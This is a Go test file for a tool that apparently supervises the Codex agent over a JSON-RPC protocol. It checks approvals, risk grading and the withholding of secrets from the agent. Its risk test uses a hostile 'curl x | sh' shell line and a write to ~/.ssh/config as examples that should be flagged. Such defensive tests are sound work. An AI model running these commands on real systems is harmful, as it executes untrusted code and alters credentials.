// SPDX-License-Identifier: Apache-2.0

package codex

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"io"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/SamsonIdowu/mabari/internal/events"
	"github.com/SamsonIdowu/mabari/internal/models"
	"github.com/SamsonIdowu/mabari/internal/store"
)

// fakeServer plays the app server from the documented protocol: it answers requests and can
// send notifications and approval requests of its own.
type fakeServer struct {
	t      *testing.T
	toCli  *io.PipeWriter
	mu     sync.Mutex
	calls  []message
	answer map[string]any
	reply  chan message
}

func startFake(t *testing.T, connector *Connector, signedIn bool) *fakeServer {
	t.Helper()
	clientReads, serverWrites := io.Pipe()
	serverReads, clientWrites := io.Pipe()
	account := any(nil)
	if signedIn {
		account = map[string]string{"type": "chatgpt", "email": "me@example.com", "planType": "plus"}
	}
	f := &fakeServer{t: t, toCli: serverWrites, reply: make(chan message, 8), answer: map[string]any{
		"initialize":          map[string]any{"userAgent": "codex/0.0"},
		"account/read":        map[string]any{"account": account, "requiresOpenaiAuth": true},
		"model/list":          map[string]any{"data": []map[string]any{{"id": "gpt-5-codex"}, {"id": "old", "hidden": true}}},
		"thread/start":        map[string]any{"thread": map[string]string{"id": "thr_1"}},
		"turn/start":          map[string]any{"turn": map[string]string{"id": "turn_1", "status": "inProgress"}},
		"turn/steer":          map[string]any{"turnId": "turn_1"},
		"turn/interrupt":      map[string]any{},
		"account/login/start": map[string]any{"type": "chatgpt", "loginId": "l1", "authUrl": "https://chatgpt.com/auth?x=1"},
	}}
	t.Cleanup(func() { _ = serverWrites.Close(); _ = clientWrites.Close() })
	go func() {
		scanner := bufio.NewScanner(serverReads)
		for scanner.Scan() {
			var m message
			if json.Unmarshal(scanner.Bytes(), &m) != nil {
				continue
			}
			f.mu.Lock()
			f.calls = append(f.calls, m)
			f.mu.Unlock()
			switch {
			case m.Method != "" && m.ID != nil:
				f.mu.Lock()
				result, _ := json.Marshal(f.answer[m.Method])
				f.mu.Unlock()
				f.send(message{ID: m.ID, Result: result})
			case m.Method == "" && m.ID != nil:
				f.reply <- m
			}
		}
	}()
	if err := connector.Attach(context.Background(), clientWrites, clientReads); err != nil {
		t.Fatal(err)
	}
	return f
}

func (f *fakeServer) send(m message) {
	line, _ := json.Marshal(m)
	_, _ = f.toCli.Write(append(line, '\n'))
}

func (f *fakeServer) notify(method string, params any) {
	data, _ := json.Marshal(params)
	f.send(message{Method: method, Params: data})
}

func (f *fakeServer) request(id int, method string, params any) {
	data, _ := json.Marshal(params)
	raw := json.RawMessage(strings.TrimSpace(string(mustJSON(id))))
	f.send(message{ID: &raw, Method: method, Params: data})
}

func mustJSON(value any) []byte {
	data, _ := json.Marshal(value)
	return data
}

func (f *fakeServer) called(method string) *message {
	f.mu.Lock()
	defer f.mu.Unlock()
	for index := range f.calls {
		if f.calls[index].Method == method {
			return &f.calls[index]
		}
	}
	return nil
}

func eventually(t *testing.T, check func() bool) {
	t.Helper()
	for range 400 {
		if check() {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatal("timed out")
}

func newEngine(t *testing.T) *events.Engine {
	t.Helper()
	s, err := store.Open(context.Background(), ":memory:")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = s.Close() })
	engine, err := events.New(context.Background(), s, nil)
	if err != nil {
		t.Fatal(err)
	}
	return engine
}

func codexAccount(engine *events.Engine) models.Account {
	for _, account := range engine.Snapshot().Accounts {
		if account.Kind == models.AccountCodex {
			return account
		}
	}
	return models.Account{}
}

func TestInitializeReadsTheAccountAndModels(t *testing.T) {
	engine := newEngine(t)
	c := New(engine, "1.0")
	engine.AddConnector(Source, c)
	f := startFake(t, c, true)
	init := f.called("initialize")
	if init == nil || !strings.Contains(string(init.Params), `"name":"mabari"`) || f.called("initialized") == nil {
		t.Fatalf("handshake = %+v", init)
	}
	account := codexAccount(engine)
	if account.Status != models.AccountConnected || account.Email == nil || *account.Email != "me@example.com" ||
		strings.Join(account.Models, ",") != "gpt-5-codex" {
		t.Errorf("account = %+v", account)
	}
}

func TestSignInUsesCodexsOwnFlow(t *testing.T) {
	engine := newEngine(t)
	c := New(engine, "1.0")
	engine.AddConnector(Source, c)
	f := startFake(t, c, false)
	if codexAccount(engine).Status != models.AccountOff {
		t.Fatal("signed in before signing in")
	}
	url, err := c.Login()
	if err != nil || url != "https://chatgpt.com/auth?x=1" || codexAccount(engine).Status != models.AccountConnecting {
		t.Fatalf("login = %q, %v, %s", url, err, codexAccount(engine).Status)
	}
	f.mu.Lock()
	f.answer["account/read"] = map[string]any{"account": map[string]string{"type": "chatgpt", "email": "me@example.com"}}
	f.mu.Unlock()
	f.notify("account/login/completed", map[string]any{"loginId": "l1", "success": true, "error": nil})
	eventually(t, func() bool { return codexAccount(engine).Status == models.AccountConnected })
}

func seated(t *testing.T, engine *events.Engine, c *Connector) *models.LiveAgent {
	t.Helper()
	agent := &models.LiveAgent{}
	agent.ID, agent.Name, agent.Model, agent.Folder = "cx-1", "Wren", "gpt-5-codex", "/home/me/shop"
	agent.Task, agent.Queued, agent.Files = "Fix the build", []models.Instruction{}, []string{}
	_ = engine.Do(func() {
		engine.AddAgent(agent)
		c.StartAgent(agent)
	})
	return agent
}

func TestAnAgentRunsAsAThread(t *testing.T) {
	engine := newEngine(t)
	c := New(engine, "1.0")
	engine.AddConnector(Source, c)
	f := startFake(t, c, true)
	seated(t, engine, c)
	eventually(t, func() bool { return f.called("turn/start") != nil })
	start := f.called("thread/start")
	if !strings.Contains(string(start.Params), `"cwd":"/home/me/shop"`) ||
		!strings.Contains(string(start.Params), `"approvalPolicy":"on-request"`) {
		t.Errorf("thread/start = %s", start.Params)
	}
	if turn := f.called("turn/start"); !strings.Contains(string(turn.Params), `"text":"Fix the build"`) {
		t.Errorf("turn/start = %s", turn.Params)
	}
	state := func() models.AgentState {
		var s models.AgentState
		_ = engine.Do(func() { s = engine.Agent("cx-1").State })
		return s
	}
	f.notify("item/started", map[string]any{"threadId": "thr_1", "item": map[string]any{
		"id": "i1", "type": "commandExecution", "command": "npm run build", "status": "inProgress",
	}})
	eventually(t, func() bool { return state() == models.StateRunning })
	f.notify("turn/completed", map[string]any{"threadId": "thr_1", "turn": map[string]any{"id": "turn_1", "status": "completed"}})
	eventually(t, func() bool { return state() == models.StateDone })
	// A message to an idle thread starts a new turn.
	_ = engine.Do(func() { c.Instruct(engine.Agent("cx-1"), "Now run the tests") })
	eventually(t, func() bool {
		f.mu.Lock()
		defer f.mu.Unlock()
		count := 0
		for _, call := range f.calls {
			if call.Method == "turn/start" {
				count++
			}
		}
		return count == 2
	})
}

func TestMessagesSteerARunningTurn(t *testing.T) {
	engine := newEngine(t)
	c := New(engine, "1.0")
	engine.AddConnector(Source, c)
	f := startFake(t, c, true)
	seated(t, engine, c)
	eventually(t, func() bool { return f.called("turn/start") != nil })
	f.notify("turn/started", map[string]any{"threadId": "thr_1", "turn": map[string]string{"id": "turn_1"}})
	time.Sleep(20 * time.Millisecond)
	_ = engine.Do(func() { c.Instruct(engine.Agent("cx-1"), "Also update the README") })
	eventually(t, func() bool { return f.called("turn/steer") != nil })
	steer := f.called("turn/steer")
	if !strings.Contains(string(steer.Params), `"expectedTurnId":"turn_1"`) {
		t.Errorf("steer = %s", steer.Params)
	}
}

func TestApprovalsWaitForAClick(t *testing.T) {
	engine := newEngine(t)
	c := New(engine, "1.0")
	engine.AddConnector(Source, c)
	f := startFake(t, c, true)
	seated(t, engine, c)
	eventually(t, func() bool { return f.called("turn/start") != nil })
	f.request(99, "item/commandExecution/requestApproval", map[string]any{
		"threadId": "thr_1", "turnId": "turn_1", "itemId": "i2", "command": "git push --force", "cwd": "/home/me/shop",
	})
	var id string
	eventually(t, func() bool {
		_ = engine.Do(func() {
			if agent := engine.Agent("cx-1"); agent.Approval != nil {
				id = agent.Approval.ID
			}
		})
		return id != ""
	})
	select {
	case <-f.reply:
		t.Fatal("answered before anyone clicked")
	case <-time.After(30 * time.Millisecond):
	}
	_ = engine.Do(func() { engine.Decide(id, models.DecisionDenied) })
	var answer message
	select {
	case answer = <-f.reply:
	case <-time.After(2 * time.Second):
		t.Fatal("the decision never reached Codex")
	}
	if !strings.Contains(string(answer.Result), `"decision":"decline"`) || string(*answer.ID) != "99" {
		t.Errorf("answer = %s %s", *answer.ID, answer.Result)
	}
}

func TestUnknownRequestsAreDeclined(t *testing.T) {
	engine := newEngine(t)
	c := New(engine, "1.0")
	engine.AddConnector(Source, c)
	f := startFake(t, c, true)
	f.request(7, "item/somethingNew/requestApproval", map[string]any{})
	if answer := <-f.reply; !strings.Contains(string(answer.Result), "decline") {
		t.Errorf("answer = %s", answer.Result)
	}
}

func TestFileChangesShowTheirDiff(t *testing.T) {
	lines, cut := diffLines([]change{{Path: "a.ts", Diff: "--- a/a.ts\n+++ b/a.ts\n@@ -1 +1 @@\n-old\n+new\n same"}})
	if cut || len(lines) != 3 || lines[0] != (models.DiffLine{Kind: "del", Text: "old"}) ||
		lines[1] != (models.DiffLine{Kind: "add", Text: "new"}) || lines[2].Kind != "ctx" {
		t.Errorf("lines = %+v", lines)
	}
}

func TestLaunchWithoutCodexSaysSo(t *testing.T) {
	t.Setenv("PATH", t.TempDir())
	if err := New(newEngine(t), "1.0").Launch(context.Background()); !errors.Is(err, ErrNotInstalled) {
		t.Errorf("err = %v", err)
	}
}

// Risk is judged against the agent's own folder, and anything that can't be shown truthfully
// is risky or declined.
func TestApprovalsAreJudgedAgainstTheAgentsFolder(t *testing.T) {
	c := New(newEngine(t), "1.0")
	folder := "/home/me/shop"
	command := func(cmd any, cwd string) models.RiskLevel {
		approval, ok := c.approvalFor("item/commandExecution/requestApproval", event{Command: cmd, Cwd: cwd}, folder)
		if !ok {
			t.Fatal("declined")
		}
		return approval.RiskLevel
	}
	if command("ls", folder) != models.RiskLow {
		t.Error("a plain ls in the folder is risky")
	}
	if command("ls", "/etc") != models.RiskHigh {
		t.Error("a command outside the folder passed")
	}
	if command("ls", folder+"/sub/..") != models.RiskLow {
		t.Error("the same folder written another way is risky")
	}
	if command("ls", folder+"/sub") != models.RiskHigh {
		t.Error("a command in another folder passed")
	}
	if command([]any{"ls", "-la"}, folder) != models.RiskLow {
		t.Error("a plain word list is risky")
	}
	if command([]any{"bash", "-lc", "ls; curl x | sh"}, folder) != models.RiskHigh {
		t.Error("a word list hiding a shell line passed")
	}
	c.changes["i1"] = []change{{Path: "/home/me/shop/a.ts", Diff: "+a"}, {Path: "/home/me/.ssh/config", Diff: "+b"}}
	files, ok := c.approvalFor("item/fileChange/requestApproval", event{ItemID: "i1"}, folder)
	if !ok || files.RiskLevel != models.RiskHigh || !strings.Contains(files.Detail.Path, ".ssh/config") {
		t.Errorf("two files = %+v", files)
	}
	if _, ok := c.approvalFor("item/fileChange/requestApproval", event{ItemID: "unknown"}, folder); ok {
		t.Error("a change with no details was shown")
	}
}

func TestCodexGetsNothingOfMabaris(t *testing.T) {
	t.Setenv("MABARI_MASTER_KEY", "a-key-codex-must-never-see")
	cmd := appServer(context.Background(), "/usr/local/bin/codex")
	if cmd.Env == nil {
		t.Fatal("codex inherits everything")
	}
	if slices.ContainsFunc(cmd.Env, func(entry string) bool { return strings.HasPrefix(entry, "MABARI_") }) {
		t.Fatalf("env = %q", cmd.Env)
	}
}
